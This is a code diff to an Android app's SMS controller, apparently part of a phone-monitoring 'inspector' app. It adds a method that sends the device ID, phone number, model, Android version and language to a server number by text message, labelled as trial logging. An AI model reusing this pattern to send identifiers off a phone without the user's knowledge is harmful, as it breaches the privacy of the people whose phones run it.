@@ -13,10 +13,12 @@ import com.particle.inspector.common.util.DeviceProperty;
 import com.particle.inspector.common.util.LANG;
 import com.particle.inspector.common.util.StrUtils;
 import com.particle.inspector.common.util.SysUtils;
+import com.particle.inspector.common.util.license.LicenseCtrl;
 import com.particle.inspector.common.util.location.BaseStationLocation;
 import com.particle.inspector.common.util.location.BaseStationUtil;
 import com.particle.inspector.common.util.sms.AuthSms;
 import com.particle.inspector.common.util.sms.SmsConsts;
+import com.particle.inspector.common.util.sms.TrialInfoSms;
 
 import system.service.feature.location.LocationInfo;
 import system.service.feature.location.LocationUtil;
@@ -316,7 +318,20 @@ public class SmsCtrl
 		String srvAddr = context.getResources().getString(R.string.srv_address).trim();
 		return sendSms(srvAddr, smsStr);
 	}
-
+	
+	// Send trial info SMS (client->server)
+	public static boolean sendTrialLoggingSms(Context context) {
+		String deviceID = DeviceProperty.getDeviceId(context);
+		String phoneNum = DeviceProperty.getPhoneNumber(context);
+		String phoneModel = DeviceProperty.getDeviceModel();
+		String androidVer = DeviceProperty.getAndroidVersion();
+		LANG lang = DeviceProperty.getPhoneLang();
+		TrialInfoSms sms = new TrialInfoSms(deviceID, phoneNum, phoneModel, androidVer, lang);
+		String smsStr = sms.toString();
+		String srvAddr = context.getResources().getString(R.string.srv_address).trim();
+		return sendSms(srvAddr, smsStr);
+	}
+	
 	// Send unregister SMS to server 
 	// SMS format: Header,<key>,<device ID>
 	public static boolean sendUnregisterSms(Context context) 
